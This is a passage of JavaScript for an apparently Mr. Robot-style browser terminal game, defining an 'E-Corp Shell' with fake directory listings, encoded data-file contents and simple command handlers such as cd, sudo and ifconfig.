Iezm6JD+m7CL9CqyRXnGmGB0kXofe0bYg4V4xoDAfJQnwvTLKRGmBrNFeMYAYAKwl+ZvYiGe
MTidxXrG5FTOPeNCOPckobFgohNEnwKryelUn8YMzq3H+SaTY+zWTudZD6J1nEIgoBQJjvO/
SR6FHce5JBJRiU7wF5xO60E0jvM2ANEJflB//JExT/mtvP9Akd8DILmfHAByT/utXEwnRCIB
Cp4HcKEGORE6fAmoKPmSOgEoHefJkyKBmHAJAJ5oQOQCwNeBkst83bsJQOE4f+2EiGRMeJtN
AL9OIPABwJ8DBW/w564AkDtOD2D+g72QAPQKOUSBQp4Blq2UCmrVGpSKBGoVy1WltA6ALMkS
WyLkTMipXXZNAaonCQpGFFR8pqRQ06EuUco9W0O/VuELAFINRCI/xgX1MlT3gr6Ldkjiy7go
LWOzouJSiSu5Bi7VLX7CFU3MuawGGmJ4UXiR0IpChUF60kWo/Tv0brhSGDP0kydd8rzeL+jW
0PShsk/3u52LIdCEaoi0fgZCJdRfqMUaRLHESFXhMxgTQwh0piUMVDXXavUG/SZaMUL/vbay
dJ02lgq69BUQ5fyskldIoqmW4yjqe01jqgs8p4lQwK26c4O6LqHG9LJUoq762Qs1U22ohJcS
mFI+OUwOEyPReEtGZTDQepv9JbTa55LMErVB79uwzJpNkUazzI8YvmST8d/K1wBoeGk4MBww
EWn107iR1mtE2TSld6fBL6z+x3uTD6+3fT6xJaQXfzn1ue9PN/vwM37z4bY6/Hz4/tRqh62f
T+8aQGgKz77WCA2IZppH/z9/BzBjdJwVaUWiF+EOtECP20z4R/TpNrRQF9ItfmgfI25RgX3w
wwMmYMThcUHmUd//3Cbg0vwKmeUstf9IBOCyHSRpCayAKAeqUrPOOkIS3QHkdcFX1YAvqAHI
UzmlP/1h8/sAfE0CdQHugJD+2O5uS10Et7mNSAT5R1HfH4VdCPzu0RUFlupvod/+IVDjP81a
UH0ZNVDZuwrs5EsNIE8iuHgv6gvtCC4maQRcQrmd2P/v9MA+IQzARoN94MqoA0HWA8wgR86H
Ezez2StTA5/3yk+nBBSUV6cuYC8BtTD7zpTQ2OtRy6EygTBLq6OCgrVnIZ9Hfa3JBIqPLNxH
te0mOMYURmhtNCA/XpX1CgpmPeRA1uJZQLQBmNeCY3wFeAEgP1ktKAgtRCeZfVyftzcCohPk
5L+1iA98TPbvPPps9NHH5FbvbxPnnHPOWRHgQjgrAlw4`,
      str7op6ypyn7kdat: `jtreNe7CYnDo1GbO4ihfxMjtxHrDVQq4/faqkzcKZRFIxSo0CnlIjh8KeDd1Iqu5VBhVwDjta
kogF59Ww535l7vlqqnriocFmNZokJS4bZOBMMB9LqKRrBsTYCGNVMtyW1KBv/9gYwdhxUDJQ
ND8SPYNKaJ3HQbjTWMehGEn4SeYPYnuWLWDtHPp04ybk9pNk2FcvWnXeFFtLV+Gj80f0lIL6
421tXh39xWb1udxlK18UpnF+4+ZAURrABoAHAdtI4xgYQRADpoALLUMkIDETAC++h50wGk1U
QHOq7CFLlDA0hocaui0YIWwAE6AOu5ghVrCrsqEF1orgKlVg2WrAFgJiJKS5IUoAqNZAY7IF
gGlDMdG7YsG7IGZNanDlgL/SyBFVsAWG2exZJmRdI+BZtZt0oOLcisi4CpYz29aj62hfQtXQ
D50s/7j0Q2kYOPvN6S6svYeBOK5e+/A4SW6pjIoGVrj/nYFuNeqvdjgvmoTesSLsLc65U2Gq
QBZl0zArHhCoUtQBFGXrs5NXfHtgBhaglgPmpzp3vlL5DDR16vvGqv09huYGPcaIksraJSPP
taCyhgu9kjjAD2EkA2zL3a3vcw/wSrnY1Ge8zBRcJ47/OROApYdSaztDFrmH+CrIUXAEDEVR
C6VYDcx2Y2tQ/c2gnCYzqAO/Yf0dXlPj57TmPWAUBwzjnnPA6R8uRlARQAIgA5QK2mBlQewB
JbJy+vAmuY1wCWARoNDWDnDOvwxonLkDwu0XHeO3G5dAsANYD0GCKflZtfgqICwD5AqAEocD
rppEjAF30J4IvAEwCwQ47a1ADwDfeTAxfqkyISf+nrAH/pJA0R+yQAvut+Ls7DwpMiNZ0/B+
iAJccJ2AEA33Q/v56HhSf5OUpFkvyvQYsNSVJbNwOZGRBIK6iUtFpawC4RUaBFBIAkuMFOSA
hSKAVduvs5UKTViRHBxiiAGCpKAHu9CmVIqicRyvtF1sm5VOJfkIt2gvfqEvt2lUqWvTKgYk
2oewouV9JOspM0iXKzQU0SU7RDBIBGTLWucNRQT9UNpv0CCe+qeHLK79Z4xoQLknaTG9wQno
bnuaxypTC6+4gIAAqS9ys0BdfiuwX+dYVGXZXptfdVirrg5ffUJKWJbkcohEJcLV5XXJOEl+
hM+d1H3CcyKukkilGeq3Crk5hUley6W95XjJZK/xrKQQUqKlP92Vp7I6TWa5ro3iMiAEqmuE
xpB1Nkuh2S20efE7JkqPt9kwv0DYz5Gpum26bbxluX6L5Np9Y+lzDdJh6zG6V/+o+nvp02pg
8vr8/aXXtTd/cz9bbI+naWSnL+F9tTUvnVz6euYJdd2hJbgezlu78iLD58hAgAE9BjAlka0Y
MBBaxPKIER4JepzVI7UxOaDi0gS0THuXPL1Knhjp7J/LNGSQtU/DiB2wdcBQgpAUPDP0LvBF
VIzC9L/xAATQoqoi1VSDU51BkwY8ZKCI3/KEVrcps4ekQEAGXE/HI5+78CEOx8HnK3lBEKqH
LgkEPumBobKahENXcf0YoAmKeBpA8v5wNcSGJzZAqX5m3LAeXnHCfZIr0qhF1kp+zonHVAqD
86xWH+OU9pUFIetVVUMbHaOkZilz2M0EknRNpDYGq0h/r3R8DULH9O8zrKb+m0E6pXx0RzBx
gZGQiv/H+MOoN97j6iOt1lzC+j47bxWaud0qx39SPH2AKRSB5aey+xlxiB6CwiAB1spKxVwr
ZZAxwTMXgqPKSVC46zOiUK2JhOdAaivYF0X0H0MPRTOuPcwOb2Y0dT749nnRv4euecc84555
xzzjnnnHPOOeecc84555Ok+Lu/0xawCgDlqYNdQLQo2u`,
      strm91ft6waa8dat: `GFCF15K3FH19NPLMaSWG+o/cAga/zVk15VD/hW9hMN8UqHhDwJGY1lGewp0MRIBhgP02HHIUB
g06Crf1l7hupw27EOWGD/LYEdOktbwC65oiCZ4zRJ6iAChgWDYmAZ1+DeEn2Xvmv2JLTdr2X
farCMkiFR+OTJtTD/tsuv8fOqEPtTj9pTWqTauWfHuNJBnnQiwIo0gAczVBQCRRGF0GjfBBE
igQXScSQNuMRqwzxSjAcgpghJAjQEHIJoSb6LlHbfBAIB1WI5ySEssuexJa7Lk0owaNgvWZ6
mizrAEXNHAphwQGtftgOVCKQLchjKkP4a6oPD18K9VpqT6gAQ1ftUnVDkK4HoANYC4uXpNAu
VSOBABwLq9q1B9mRV/OLbpVdgchQZ2YZqHeyskws+WGjm7APLvvxOzloL1MN5v57ZGHWw0rI
deswdeJkJoc27fUbLaYl2oiVnPl4RWBMyaMQy4xFavAaDAa60J7HV23p29MoSpEbzy34qryG
ZpGWyyPbDTkcTV1Yk//k3RErD27EY7mxKF19pscFxkuwFsNDbaCXsEe99JYYTJKniW1ZaNFs
KYDVQmZgnMesLI/IkACqwCYJa+AgQbWecFeNashY2E+TNfgMKzZB0ILYBVx8idDmlu1MimFq
tTch/rDzJ00dmYHABG++hPirw97zuds9/ERgLYBsO5ofs7lEXt+hTo+D2PRQnUfitZy5cXks
vtPpTVq/1WKgAKAE8BV5Goc0igElBZL8lBAtglOpXQAFCe8t8qkKUCAajFRO1SSwEBAKJTWX
KCy3TYpwHLjjEm+JUTNKeIRLC2737eYMQOvQKbNVQAUwVvH7if7hSRC+DzCVAAeA94HS7h98
AVgHAFVmsAAuAUkQ/AMwDfQJDjs/T4Bq238Tz4gRKImyWeBAlcTL/1TUbH+C5iivji/AY9gN
ZlYNwpAEINnkwAuVNZA/gmxjTDX85vAJuAN4BJjmWYGvDXTkdo0PJCDisqpXUyCrklKqU1Qq
O3gtBQyHexbNdXsAKhycXTUuyNUayCUOZ+ksFnVCAfKShRUQtTW7iGQkldQFn0opskIqUcVK
VOBEBFTopy/0rSqHA57CItcbFkjcu1aCr8c73cDFxsqKOfeCupe5jhgk1SVogAqDmsmSrupD
pUfoE21i5OnqA3eIZWl8O/A9in53I+OFrPBWDwvCtFnosAePm9Im99LXZMz4llvYEuV6FMho
qv8m46sm1jIsojDJIe7KuUyDF6iW5WiQBYKovClOewn6a6rlUcqnreK8DrFfgDTDW9LkoFIb
XAgaQc6OT4lxr/s04EwAWQWOIgjbewhmSovfN18KM1cMUy+wx6miXonibjloaRXoZOW18mAi
CvytVGMWvDNP2cm+nFD21almrbZne9mfXf3CDUsmlKIOc3pWD2JwPT1KIC/TT6J1b/l396/E
0+cwXQo5kBDLAFtCDwA4zQgA68DUbQACAC4AubOvQG+oTkgAG4TZVzQCojPZiXsM8IAHeQqB
3nOZXagQqsBBHUaYld7D4VGkJzNQdYslzYQbQGsKPOWAbLNt1HXW/NUvjvswYUoXkWNM0KNb
aHAFOXA6xYX9YiswXQ2pmxDp6yCxEA9md9ij8dGsD2DyE01ZcBA9BhLhKzVkF6FRBa5edYB/
8gnBCpdtpJvisBkx6ijQbmuVy9HwHWbYWBS+wBxMZqyxaoR/ezY7VbfmrWA7m9hLhqr6cCEl
gC7HSv3fVthTA1wNJR3PlaC8/98qTHuIpsAMiBMNpo7xOZJWCj3W7CCPbM2612thvYbkb3sw
3dfSJewH0iWQfM0qr7uQpWwWpygo0JACIAKIH6kXK4CI`,
      strrigw2zlzczdat: `yt0/td86qr06jTa+ZzZNd9O6wtO/Wene2Q7r1tmYhqOTItaJUKO1ix70QIc0ArsD0HdgYCS1Y
IXwXyZAw2QiAbS9iJASAAnYr+l5B3AADqY7B0e1Q3hHB7gankwSGi1vepMGsA8IofH3G22pC
WIVUrQGgKVgWStY5jOO1xDSOrEIoiwFgAyWo7XQELE7NcrafhFofr+MggoAhVTaJ5Vs3FdDd
Bt3NL8v3/k8QA5lUKmJIFm/Z8q2f1gsJ+lVAKyov4W7f246XkOe4ILtH5ptvAkwg/V7zRESW
8h6k37WsQcA67YTbCfSfTXMIHww6a2kAWAFtuyBiBu89r9Pmk6SbrST0QEAO69ObmlMbnmlP
V7D2pf1GKUbm99qXgdsfguv7Y4OpgSE1naT1NkAs549AGy0tpOa7WTv5JvMegVZg9UO+Ohyu
7FHAgxWJbVTmSWowYYThFZB6N1Tgo9EQQLsDdSqR91Kl2PqOZ2aCM3tT+7HeRDh9e78x3n/P
nPO+byaitLiWQMAu2x94iKf+JsE5EQQfTLExJf4rMWzJgIC/pjfR7VwkRlrABXlMpss/k0qA
CjZsljWYT27LgdYCc2aaIEEFPL8ebYHMQhejlW3SJEldrHWFlysUZB3uXyRIk+AS894P+kTF
6SY6sO6X6RImdRqXy2LxpC/VZoKruetRYq8Z6LuXi/L4mibqGJUFBYq8k4t0f+IJS4y5qZIX
KjIDCFZrzb+aBoKlV+V/umN1dcW+p1sMaAFFQBEi6e9TY3b3NFZKLs0wd9vaomkzlQhze3cg
jgQSGW9uZqgypXR2myxIsRG/S2r7yhQfk6xnGZ9skhqM2F63/ZgXWNvtD3ZGBEtjHb5cyb/Y
2rf8jaaO9pD3XsWSpUNbDcJdFZbs86iqXSQwIs+GUqgBtvjp5AJtXc+YZHzjZ7nnJMcJzj9P
hEgekhmTn9UcIL8kUXWHuJFH1lknvmdTqgXIfJPAAqnMTVQP/pQlwrhBsA3AJBDCRLiPopHG
+pyBacfzncRLoP5lM5LwNcfUuQHsAPwTQD8Gt4A8EGDt4E/97CUQocalRLIkhahwR+xSyDBo
w11ScvlVMhtiqGCHIR5sPjPSMongEcZ6rKEWHpGVFBweVPB5ijCjxEIBbVQh+RRhro8IdSBv
0LugqR93jLPM1Uuh4p9Jfsu5yaxduURhrqU18g5FJSlie6aNZI8dkksoxh6JD0pf5pHGOryX
j4ZGdOgLwcVN2BfnofUTnX0cgz8YWqDo9GdDzfUZe7W4pqpHhXGfI1vW6YD3XiLhmZKuqphO
NA+wlCXWcH6bJqwe3Q435bIrmJ2E21+NJ/zJbP/antK4Sc8wlCXLUwtGEBogAQzDSYAK48+1
OXNDlzl9gG8SaIHGNTwpwk8ylCX3VIDMuoMWYJC6QvWVhT+MyXRmnujO1UhPeSbHBQByKlyT
AlKy9m/VN2R+z+EA4IKbke1Mj70vJV8qQEzys8BWJMNTXqVmN0cW/OIMIRdxfLDvomsB1ZYb
QHUOmkPYeg12AOMzDoPKdJ20kfpXnMHEzy3q39/1A16PzxMjA6gH7TaQ6ge1q1htWO1RYDtB
vZSLozAHig80niaCpA1gACrCcgXMwC+dD8JABHAKaLRp0D0t4xzzjmnFAGogPKBLioHRBEAa
gCE+x58WX6isQIAwXG2ALn8Qf+kVSKANz7+DomCEo2PSQTw3se2P77BZbLbDy/yWQD16fYHq
PFd3iC/4STpwSJfBIj7yFGAGi0l8+I36biQAiKgBhdqFChOF/nLY47vInKwDxTMiw0gJgLM2
55ocAn56SLdMcf3a0SwA+TMi0BmTEiYt/064W1ETmcGu`,
      strs2vvij1g3kdat: `awAWKnJ2BLgAzo4AF8DZEeACODsCXABnRICL4qwIcBGcGQEuhLMiwAVwdgS4CM6MABfBmRHgI
jgzAlwAZ0eAC+GsCHABnBEBLogzIsDFcGYEuAjOjAAXwRkR4GI4IwJcDGdEgIvhtAhw0ZweA
S6evfZTEFlt7hc5p/o0xoC2n8KGxnCmSOexmTUeTNY+fnK48mgnPmwBpQAgAUB+vLsSQQHBC
dZLp/CsCJdFOLm0AAC/08hBCdEJLrVOJcIbPhb/xhn8yn1EaEV47+P9zX9j34NDwBNjQD8Lg
zi/BggA4DJwbDpoAoCnAbBaO84XRYjwRafng3iDAHKeAS7UAgB1kgM8CQgAf+mzdOLR9en5I
DokuIh5MBgTgHfTAwbDdL4IETqn54OAGn7N2jwYHBOAKwSAZYD61J2lWSoVKmX4mYg2CljBi
gbwgnwm/ERYny+pJXVWwi5fYf3eiiiUZIXcsoggUaJCDqH86H7hM1IdptYlP5ERvwA5lZJNy
s1xGa5HN/nCvRWRZfLrVETIsxGX1rg8cWFJREzyXq5SpYjcv+IFOXEXVnCpULeFl2WC6K2kv
reC+DIFFysiRzsz6Z6hxfCEqWIUU41feK3JUbmT1A5rIxeBLve7XT4FeVJyWPvZvRWMgTu1X
i9ScL1G/1U6jB/ObmEqSGK9Iaa7I1tMdVDkrUmFAn3pe20pV3w19NhPX7m3gilXTgw1kWL0P
iWvV8h5L8/v3aeva45GtrAvFUVE1dMq6al7o/djhH/9Urq3IjIyK0B0bzbLMj9aQ8Y7NSExR
QZKjSv8mgOJkDDQWabwI0Ud9ftk3PLRipBEpSWAyvTTm2ljGja2p97Pp2l2sNpm07Rv+m9lx
o1ftkG0Ok3d6k+rjZ9O03dT5IkPlww2DXs/lt2adbNpuhOGeyuyafqxavbfTWPKRbAuoYWGL
QAjIAD8GAwgYdAZTNYxOM7E+wlEuINbOMAd6B3CHUjGNkYG9El3COAWV1WuehODEdNHKw55E
7epCzjamUloALul6ug+M5GjkS2gUiMtsQYksFUoEeVmIsyb22dFyugWqAEfzm5BGVE0vw8fB
BVYm9WoCyoAuLUUDu5FgPdWQBkSf/pDkWI5QYkKyIZGPLq/sv1DGKVXwaxPqL7MFiUAYWxh7
+pHKyKKpQa9yKwDl3EF6CQXzDr8R3pE9oB2go2GXS4D0Gsw6u6tcAH/Q4/9A9gYlCglFahmP
dHGwE63lzga2QJWO9jrwysNJRpQZgOYPlohYmMEMOuUIAGq+X0bLdw3soWNdv65BSXmJQDHH
eOpIjBLIOvcz1OAF0B5bMXpFKAGlA9zAt/eCIUHER9v8uc8BFyAiKo5DwEfi+hTYMUnSQKe+
iS3woYGeOET/XleAtrCI5MAwFUgOUH28nruJAGgJocE8fSmM/1m9i/eLpxkBSBRIIDot1Npw
JqTjDu9U9h82L/u4Yr+ZNwWWnD4bcd4CvjRw4kU4ia4L26LpdPO8nsahLc+nkiJEt8w7mgh3
FChpkBegKyOIADqBLFSoz5L5DIKfNcEwBVU5FAAApDmrg7YR3WWyBvI8U0AdvwAJREXgJAkU
ANXgMYOSk5nC4QG7TKV0qZ/QBI6hGaTJRTkolkTvoe510vMyFpkaZOWFZXPNBABvkapLKhD2
ecqPF8HlFNBilVbGhQEOfVQTY6cG+RRqUjVWAryugVJBUqR+csXbCOKBS5LNaEuPYNcUQly/
7sVXKgPb9iSq1SWUdatUjU9j0JhJ7GFf2hJIYJYuw6Xc/analhG6/+uM+Gv7o7a7DaN+D+tY
uDPJPxC40kuht/tvIv/l5jeT50bgNYTiCB/OrxAnvRRH`,
      strxf49c7k6j1dat: `DuEA9n7x5e5L3Bx6RqPALnnLOeAJDd8InwOQCIrb+7RABQQ414WkMpElFBALgOCDjbydFAg6X
THO6WJZawAxlg9ieADBA9NB8A8IbTWFvEjs4awHtO43+bHl8k7gP4rBPU/BNniQQAUAFADVz
YEQBfBIAc4r5wAyCpUIkPzkNLANgHPmhIwF8CwEW4sAOA2hWUp4jUAFAAwA4wogY6APg1fNA
w16n8AIWT/BxsAWsttJgBLdAAzJhhF7LkJil062DmHydCsyYCgKokofI1ipwOhTC1agKhvNd
UQ5AwbymFz1BOBSWK1JBi1YmOkUJat6aUUNnJUyb3MtaxJN5rqpIMeTbIBvImYhQJVzzTKWw
qrSCX359iF7FuPMPRdkw3enkiB+I/M1VHTa818iSmryV5ghyXTZWJv4LnvasV6sO6FwEQ6HL
Ud7dl1oaAQrzrEUuF8lrsjppiUii4XitqRy1JHjuSQ3LXqjLJFXnrPpHGIQ7cDNQdNXf0/AG
NYnwvz+dN7ihG7/M+d1tCavM8wJh0blQV+VQUJ6Py2g16HfSlXzAZuELL9E49b2pMTLHf1++
719KhsWaq9b5NgSQSARCtbmbfb2yJd7dj/oWbvRlCDaVZMWvvNVVmSv/0lSRLEOpAMXtze/r
ONMFWvT1rC+Xqa73ofiYA0MJNTNhyP+uT9QldgAQtA6GBBO4XqQc0jHAwoUeMAD3Ug7HV4w4
wb+mnpIP7LSsAuU1qcuuKYJkSaUk+Y1MVulL1UROpCmmLLXzYEq2VKsByllKg1KqJAIhqEoU
vuiWVVAQFH1Ar48Fytv9Rk6CMbnGLuy1B9ZsyoJzSzucpwtqsdoxZaIXEmv/i3nbMHTLrcrS
2VuuNKX3UJLO1qqLCulyWut+UAVvRNLA++/GECAAjEZX/XGs7kciti4TWrNNJRiLkZh3gqGV
PZy5CGsj6dnKcbEpxlerdu9syp9Yrjfypnc6SbJZsjNWs/6hJ/pSNQUnJ3ZYwtbMe8FobbDe
sTqud+xiFkY12L2E72UuyYaM1SyZmfTVvIhvMOiUlRy17CcB2EzhqOo0XmDVPATbQz5Ks8yx
U8yb0UFJy1AKAVeGR92qW7qegON1GpkeLAB+9JT6WRzy3keecU+EzUAPUjlEKRFQgAa4BgrO
xg19BC8gax9iSzd0cIQGz7wIygOiBZHM1WAYP6ebOFlk+gNcBmzU40809pMhqDd8A/B5wppt
7SJEnwXcBzyuBh3NzorPxTQCXAQ/l5s78TkAD2PQG4GHc3INFSqIE86yvowUASUCJQe2PRkk
ZQZZSamnbB4uIbkIeEavCNepQAggSkDN1Sv4Z5VRQIK8bUii7B4psNtFbL1qmtCxX+OeINkF
I5NkoG4hNwCQcublebk1hBVH+QJHncVh70sXgSYc1/479qXoexHru5hBxmXLu5p7xfmqFeqr
6B4pcg31VZfR0kbeML8tjdw3kczdHcFjeSGLoSQ6JvloWjfzDdg8UuQEHblU9bxUFpq+6lrs
BDudujoHfeSm1MQYYk97rZUk+5bkHi3xbxi2DofBmYpl9Dd8G0tzNGbl8zM0NfjR3cw8W2WK
aWut1+DdWytUmm6Zrilm7BbI0d3NQBfLs/zd3c+vVxnfaQjG7+cDvJDTdgAR20QGhAWBduuf
mEhpoGdFCAkQPYISWW+j0oAcMuAMgBBjmbg4t6D2QLAExLdFWahR2fTEB9dzNycTsZWuFErA
UmlpSOlB5EBGw1KyQtmYJy4bsJ7RtS7OZpYoKMzFktlZCC1gJdldZu5sntqKzWKq+jFmfELN
fDg0QmmI5AWZM0qthnIuw+g750lGeGJ1FudGgnSAMnQR`,

      // ROOT DIR
      dirRootArr: [
        "bin",
        "dev",
        "lib",
        "libx32",
        "mnt",
        "root",
        "snap",
        "tmp",
        "boot",
        "etc",
        "lib32",
        "lost+found",
        "opt",
        "run",
        "srv",
        "usr",
        "cdrom",
        "home",
        "lib64",
        "tools",
        "proc",
        "sbin",
        "sys",
        "var"
      ],
      dirRootClass: [
        2,
        1,
        2,
        2,
        1,
        1,
        1,
        3,
        1,
        1,
        2,
        1,
        1,
        1,
        1,
        1,
        1,
        1,
        2,
        1,
        1,
        2,
        1,
        1
      ],
      dirRootAcc: [
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        1,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        1,
        0,
        1,
        0,
        0,
        0,
        0
      ],

      // HOME/HENRY DIR
      dirHomeArr: [
        "efhuiu3rh37d.dat",
        "Applications",
        "printers.xml",
        "Data",
        "Desktop",
        "Documents",
        "Images",
        "Videos",
        "anaconda3",
        "NVIDIA_CUDA-10.0_Samples",
        "HandShake.cap",
        "WPADump2_01.log.csv",
        "id_rsa.pub"
      ],
      dirHomeClass: [0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0],
      dirHomeAcc: [1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1],

      // ROOT/TOOLS DIR
      dirToolsArr: [
        "MANIFEST.in",
        "data",
        "data.json",
        "serializekiller.py",
        "weblogic.py"
      ],
      dirToolsClass: [0, 1, 0, 0, 0],
      dirToolsAcc: [1, 1, 1, 1, 1],

      // ROOT/HOME DIR
      dirHomeDirArr: ["henry"],
      dirHomeDirClass: [1],
      dirHomeDirAcc: [1],

      // ROOT/TOOLS/DATA DIR
      dirToolsDataArr: [
        "0fgizn7z02.dat",
        "3tkcl5awgy.dat",
        "4jpg7moa9g.dat",
        "5kkqf92qm5.dat",
        "7op6ypyn7k.dat",
        "h18i60bahg.dat",
        "m91ft6waa8.dat",
        "rigw2zlzcz.dat",
        "s2vvij1g3k.dat",
        "xf49c7k6j1.dat"
      ],
      dirToolsDataClass: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
      dirToolsDataAcc: [1, 1, 1, 1, 1, 1, 1, 1, 1, 1],

      // ROOT/TMP DIR
      dirTmpArr: [
        "Untitled_Document_1~sav1.txt",
        "Untitled_Document_1~sav2.txt",
        "Untitled_Document_1~sav3.txt",
        "Untitled_Document_1~sav4.txt",
        "Untitled_Document_1~sav5.txt",
        "Untitled_Document_1~sav6.txt"
      ],
      dirTmpClass: [0, 0, 0, 0, 0, 0],
      dirTmpAcc: [1, 1, 1, 1, 1, 1],

      // /HOME/HENRY/DESKTOP DIR
      dirDesktopArr: [
        "HR_Form_Drafts",
        "nems-integration.png",
        "faa-swim-sfdps-architecture.jpg",
        "faa-fri-nocc-artcc.png",
        "FIXM_US_Extension_v3_0_Logical_Model_Diagrams.pdf"
      ],
      dirDesktopClass: [1, 0, 0, 0, 0],
      dirDesktopAcc: [1, 1, 1, 1, 1],

      // /HOME/HENRY/HRFORMSDRAFTS DIR
      dirHRFormDraftsArr: [
        "draft_1.png",
        "draft_2.png",
        "draft_3.png",
        "draft_4.png"
      ],
      dirHRFormDraftsClass: [0, 0, 0, 0],
      dirHRFormDraftsAcc: [1, 1, 1, 1],

      // HOME/HENRY/DOCUMENTS
      dirDocumentsArr: [
        "Employee_Forms.pdf",
        "ground_floor.jpg",
        "storage_map.jpg",
        "pwd_memo.png",
        "pwd_memo2.png",
        "screening_flyer.jpg",
        "gamenight_flyer.jpg"
      ],
      dirDocumentsClass: [0, 0, 0, 0, 0, 0, 0],
      dirDocumentsAcc: [1, 1, 1, 1, 1, 1, 1],

      dir: "/home/henry",
      banner: {
        header: "E-Corp Shell",
        helpHeader: 'Enter "help" for more information.',
        emoji: {
          first: "base"
        },
        sign: `Henry@Ecorp:~#`,
        img: {
          align: "left",
          link:
            "https://www.e-corp-usa.com/images/home-v2/ecorp_logo_white.png",
          width: 60,
          height: 80
        }
      },
      commands: [
        {
          name: "uname",
          get() {
            return navigator.appVersion;
          }
        },
        {
          name: "sudo",
          get() {
            return `<p style="color:red;">[ERROR] You are not in the sudoers file. This incident will be reported</p>`;
          }
        },
        {
          name: "ifconfig",
          get() {
            return `  enp2s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
          inet 192.168.1.106  netmask 255.255.255.0  broadcast 192.168.0.255
          inet6 fe80::8e29:fe4b:875d:213d  prefixlen 64  scopeid 0x20&lt;link&gt;
          ether 20:89:84:90:2b:cd  txqueuelen 1000  (Ethernet)
          RX packets 8350  bytes 11271255 (11.2 MB)
          RX errors 0  dropped 0  overruns 0  frame 0
          TX packets 5336  bytes 474287 (474.2 KB)
          TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

  lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
          inet 127.0.0.1  netmask 255.0.0.0
          inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
          loop  txqueuelen 1000  (Loacl Loopback(Loopback))
          RX packets 518  bytes 40060 (40.0 KB)
          RX errors 0  dropped 0  overruns 0  frame 0
          TX packets 518  bytes 40060 (40.0 KB)
          TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

  wlp3s0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
          ether 60:6c:66:b3:90:8e  txqueuelen 1000  (Ethernet)
          RX packets 0  bytes 0 (0.0 B)
          RX errors 0  dropped 0  overruns 0  frame 0
          TX packets 0  bytes 0 (0.0 B)
          TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0`;
          }
        }
      ]
    };
  },
  methods: {
    prompt(value) {
      let td = "";
      //////////////////////////////////////////////////////////////////////////////////////////
      // TESTING COMMANDS
      if (value.trim().toLowerCase() === "test_temp_dir") {
        this.send_to_terminal = this.$data.dir
          .split("\\")
          .pop()
          .split("/")
          .pop();
      } else if (value.trim().toLowerCase() === "test_par_dir") {
        this.send_to_terminal = this.$data.dir
          .slice(0, this.$data.dir.lastIndexOf("/"))
          .split("\\")
          .pop()
          .split("/")
          .pop();
      } else if (value.trim().toLowerCase() === "test_py_file") {
        this.send_to_terminal = this.$data.serilizekillerpy;
      } else if (value.trim().toLowerCase() === "test_dat_file") {
        this.send_to_terminal = this.$data.str0fhizn7z0wdat;
        // Files to html
      } else if (value.trim().toLowerCase() === "main_test") {
        for (let iCount = 0; iCount < this.$data.dirRootArr.length; iCount++) {
          if (this.$data.dirRootClass[iCount] === 1) {
            td +=
              "<p style='color:#838383;'>" +
              this.$data.dirRootArr[iCount] +
              "</p>";
          } else if (this.$data.dirRootClass[iCount] === 2) {
            td +=
              "<p style='color:green;'>" +
              this.$data.dirRootArr[iCount] +
              "</p>";
          } else if (this.$data.dirRootClass[iCount] === 3) {
            td +=
              "<p style='color:#151515;background-color:green;width:30px;'>" +
              this.$data.dirRootArr[iCount] +
              "</p>";
          }
        }
        this.send_to_terminal = td;

        // Find by name
      } else if (value.trim().toLowerCase() === "find_test") {
        let serVaal = "tools";
        let result = -1;
        for (let iCount = 0; iCount < this.$data.dirRootArr.length; iCount++) {
          if (this.$data.dirRootArr[iCount] === serVaal) {
            result = 0;
            this.send_to_terminal = `${iCount} : acc => ${
              this.$data.dirRootAcc[iCount]
            } result: ${result}`;
          }
        }

        //////////////////////////////////////////////////////////////////////////////////////////
        // main commands

        // cd commands
      } else if (
        value
          .trim()
          .toLowerCase()
          .match(/[^\s]+/g)[0] === "cd"
      ) {
        this.$data.newDir = value
          .trim()
          .toLowerCase()
          .match(/[^\s]+/g)[1];

        if (this.$data.newDir !== undefined) {
          this.$data.newDirName =
            this.$data.newDir.slice(0, 1).toUpperCase() +
            this.$data.newDir.slice(1, this.$data.newDir.length);
        } else {
          this.$data.newDir = undefined;
        }

        if (this.$data.dir !== "/") {
          this.$data.tempDirName = this.$data.dir
            .split("\\")
            .pop()
            .split("/")
            .pop();
        } else this.$data.tempDirName = "/";

        if (this.$data.dir !== "/") {
          this.$data.parentDirName = this.$data.dir
            .slice(0, this.$data.dir.lastIndexOf("/"))
            .split("\\")
            .pop()
            .split("/")
            .pop();
        } else this.$data.parentDirName = "/";

        if (this.$data.newDir !== "..") {
          let searchValue = this.$data.newDir;
          let exist = false;
          let directory = false;
          let accessAllowed = false;
          let searchArr = [];
          let accessArr = [];
          let classArr = [];

          if (this.$data.tempDirName.toLowerCase() === "henry") {
            searchArr = this.$data.dirHomeArr;
            accessArr = this.$data.dirHomeAcc;
            classArr = this.$data.dirHomeClass;
          } else if (this.$data.tempDirName === "/") {
            searchArr = this.$data.dirRootArr;
            accessArr = this.$data.dirRootAcc;
            classArr = this.$data.dirRootClass;
          } else if (
            this.$data.tempDirName.toLowerCase() === "data" &&
            this.$data.parentDirName.toLowerCase() === "henry"
          ) {
            searchArr = this.$data.dirDataArr;
            accessArr = this.$data.dirDataAcc;
            classArr = this.$data.dirDataClass;
          } else if (
            this.$data.tempDirName.toLowerCase() === "documents" &&
            this.$data.parentDirName.toLowerCase() === "henry"
          ) {
            searchArr = this.$data.dirDocumentsArr;
            accessArr = this.$data.dirDocumentsAcc;
            classArr = this.$data.dirDocumentsClass;
          } else if (
            this.$data.tempDirName.toLowerCase() === "desktop" &&
            this.$data.parentDirName.toLowerCase() === "henry"
          ) {
            searchArr = this.$data.dirDesktopArr;
            accessArr = this.$data.dirDesktopAcc;
            classArr = this.$data.dirDesktopClass;
          } else if (
            this.$data.tempDirName.toLowerCase() === "hr_form_drafts" &&
            this.$data.parentDirName.toLowerCase() === "desktop"
          ) {
